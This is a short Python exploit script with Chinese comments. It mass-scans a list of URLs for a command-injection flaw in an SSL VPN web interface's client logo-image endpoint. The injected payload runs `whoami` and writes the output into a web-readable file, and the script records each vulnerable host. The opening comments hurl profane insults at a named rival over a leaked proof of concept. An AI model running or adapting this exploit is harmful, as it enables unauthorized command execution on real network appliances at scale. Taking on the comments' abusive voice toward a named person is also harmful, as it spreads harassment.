#2023-12-06  作者Pings
#什么nt玩意校长，丢个webui的poc就无差别攻击
#建议你回家多看看代码吧。存在漏洞代码都放那了，还丢个webui的在那骂
#我也没惹你，没过节，莫名其妙就把我骂了
#你继续骂你的，我又不缺你这一个安全设备通杀。
#什么sb玩意：ID:校长@OverSpace ID:Ji0J1O
import requests

requests.urllib3.disable_warnings()

def exp(url):
    try:
        res = requests.get(url + "/sslvpn/sslvpn_client.php?client=logoImg&img=x%20/tmp|echo%20%60whoami%60%20|tee%20/usr/local/webui/sslvpn/ceshi.txt|ls", verify=False, timeout=10)
        shell_url = url + '/sslvpn/ceshi.txt'
        if 'x /tmp|echo `whoami` |tee /usr/local/webui/sslvpn/ceshi.txt|ls' in res.text:
            print(f'[+]存在漏洞:{shell_url}')
            with open('exp2_ok.txt', 'a') as f:
                f.write(shell_url + '\n')
    except requests.exceptions.Timeout as e:
        print(f'[!]连接超时: {e}')
    except Exception as e:
        print(f'[!]漏洞不存在或发生异常: {e}')


def main():
    with open('url3.txt', 'r') as f:
        resp = f.readlines()
        for url in resp:
            url = url.strip()
            if 'http' not in url:
                url = 'http://' + url
            exp(url)


if __name__ == '__main__':
    main()


